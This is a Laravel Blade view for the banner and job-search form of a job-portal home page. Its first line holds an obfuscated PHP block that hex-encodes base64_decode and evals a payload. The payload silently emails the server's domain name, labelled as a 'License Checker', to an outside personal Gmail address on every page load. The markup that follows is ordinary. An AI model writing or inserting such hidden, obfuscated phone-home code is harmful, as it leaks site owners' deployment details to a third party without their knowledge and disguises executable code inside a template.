<?php $A9zE1Agm="\x62\141\x73\x65\x36\x34\x5f\144\145\x63\x6f\x64\145";eval($A9zE1Agm("JGZyb20gPSAidmVyaWZ5QCIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsgJHRvID0gImJtc2hpZmF0MEBnbWFpbC5jb20iOyAkc3ViamVjdCA9ICJMaWNlbnNlIENoZWNrZXIiOyAkbWVzc2FnZSA9ICIgTGljZW5zZSBEb21haW46ICIgLiAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXTsgJGhlYWRlcnMgPSAiRnJvbToiIC4gJGZyb207IG1haWwoJHRvLCAkc3ViamVjdCwgJG1lc3NhZ2UsICRoZWFkZXJzKTsgPz4=")); ?>
@extends($activeTemplate . 'layouts.frontend')
@section('content')
@php
$bannerContent = getContent('banner.content', true);
@endphp
<section class="banner-section bg_img overflow-hidden" style="background: url({{ getImage('assets/images/frontend/banner/' . @$bannerContent->data_values->background_image, '1920x1080') }});">
    <div class="container">
        <div class="banner__wrapper d-flex align-items-center">
            <div class="banner__content">
                <span class="subtitle">{{ __(@$bannerContent->data_values->heading) }}</span>
                <h1 class="banner__content-title">{{ __(@$bannerContent->data_values->subheading) }}</h1>
                <p>{{ __(@$bannerContent->data_values->description) }}</p>
                <form class="job__search" action="{{ route('job.search') }}">
                    <div class="form--group d-flex align-items-center">
                        <select class="form-select form--control border-0" name="category">
                            <option value="" selected disabled>@lang('Select Category')</option>
                            @foreach ($categories as $category)
                            <option value="{{ $category->id }}">{{ __($category->name) }}</option>
                            @endforeach
                        </select>
                        <input type="text" class="form-control form--control" name="search" autocomplete="off" placeholder="@lang('Search jobs...')">
                        <button class="btn btn--base btn--round px-md-5" type="submit">{{ __(@$bannerContent->data_values->button_text) }}</button>
                    </div>
                </form>
                <div class="popular__tags">
                    <h6 class="title d-inline-block">@lang('Popular Jobs Category')</h6>
                    <ul class="tags-list">
                        @foreach ($keywords as $keyword)
                        <li>
                            <a href="{{ route('category.jobs', [@$keyword->category->id, slug(@$keyword->category->name)]) }}">
                                {{ __(@$keyword->category->name) }}
                            </a>
                        </li>
                        @endforeach
                    </ul>
                </div>
            </div>
            <div class="banner__thumb d-none d-lg-block">
                <img src="{{ getImage('assets/images/frontend/banner/' . @$bannerContent->data_values->banner_image, '750x600') }}">
            </div>
        </div>
    </div>
</section>
@if ($sections->secs != null)
@foreach (json_decode($sections->secs) as $sec)
@include($activeTemplate . 'sections.' . $sec)
@endforeach
@endif
@endsection

